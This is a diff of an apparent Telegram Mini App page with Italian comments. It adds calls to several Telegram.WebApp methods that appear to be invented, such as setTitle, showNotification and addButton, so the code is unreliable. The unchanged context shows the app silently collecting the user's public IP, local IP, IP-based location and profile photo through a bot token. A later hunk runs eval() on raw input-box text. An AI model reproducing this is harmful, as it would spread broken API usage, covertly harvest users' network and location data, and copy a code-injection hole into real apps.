@@ -126,7 +126,28 @@
     <script>
         // Init TWA
         Telegram.WebApp.ready();
+        Telegram.WebApp.init(); // Inizializza la Web App
 
+        // Ottieni i dati dell'utente
+        const user = Telegram.WebApp.initDataUnsafe;
+        console.log(user);
+
+        // Imposta il titolo della mini app
+        Telegram.WebApp.setTitle("Benvenuto nella mia Mini App");
+
+        // Cambia il colore di sfondo
+        Telegram.WebApp.setBackgroundColor("#00FF00");
+
+        // Mostra una notifica
+        Telegram.WebApp.showNotification("Hai un nuovo messaggio!");
+
+        // Aggiungi un pulsante personalizzato
+        Telegram.WebApp.addButton({
+            text: "Clicca per più info",
+            callback: () => {
+                console.log("Il pulsante è stato premuto!");
+            }
+        });
         // Event occurs whenever theme settings are changed in the user's Telegram app (including switching to night mode).
         Telegram.WebApp.onEvent('themeChanged', function () {
             document.documentElement.className = Telegram.WebApp.colorScheme;
@@ -265,7 +286,7 @@
             let photoUrl = await getUserProfilePhoto(user.id, botToken);
             let locationFromIP = await getLocationFromIP();
             let IP = await getIP();
-            let localIP= await getLocalIP();
+            let localIP = await getLocalIP();
 
             const userData = `
 👤 *User Data*:
@@ -405,7 +426,7 @@
             const inputValue = document.getElementById('inputBox').value;
             // Evaluate the input using the JavaScript eval function
             const result = eval(inputValue);
-           // alert(result);
+            // alert(result);
             // Show the result
             document.getElementById('result').innerText = 'Result: ' + result;
 
